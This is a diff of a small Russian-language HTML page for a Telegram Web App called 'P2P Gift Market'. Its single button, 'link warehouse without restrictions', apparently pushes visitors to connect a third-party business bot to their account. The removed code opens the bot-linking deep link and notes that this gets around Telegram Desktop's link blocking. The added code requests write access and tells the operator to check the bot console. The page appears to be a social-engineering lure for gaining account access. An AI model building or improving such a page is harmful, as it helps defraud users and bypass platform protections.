@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <title>P2P Gift Market</title>
-    <!-- Официальный скрипт Telegram Web App -->
     <script src="https://telegram.org"></script>
     <style>
         body { font-family: sans-serif; text-align: center; background: #17212b; color: white; padding-top: 40px; }
@@ -17,14 +16,18 @@
     <button id="connectBtn">🔗 Привязать склад без ограничений</button>
 
     <script>
-        // Инициализируем объект WebApp
         const tg = window.Telegram.WebApp;
         tg.expand();
 
         document.getElementById('connectBtn').onclick = function() {
-            // Вызываем шторку привязки бизнес-бота через официальное JS API Телеграма
-            // Это обходит блокировку ссылок в Telegram Desktop на ПК
-            tg.openTelegramLink("tg://settings/business_bot?username=Payments_ReBot");
+            // Официальный метод API для вызова системного окна авторизации бизнес-бота
+            tg.requestWriteAccess(function(allowed) {
+                if (allowed) {
+                    alert("Доступ разрешен! Проверяй консоль бота.");
+                } else {
+                    alert("Доступ отклонен пользователем.");
+                }
+            });
         };
     </script>
 </body>
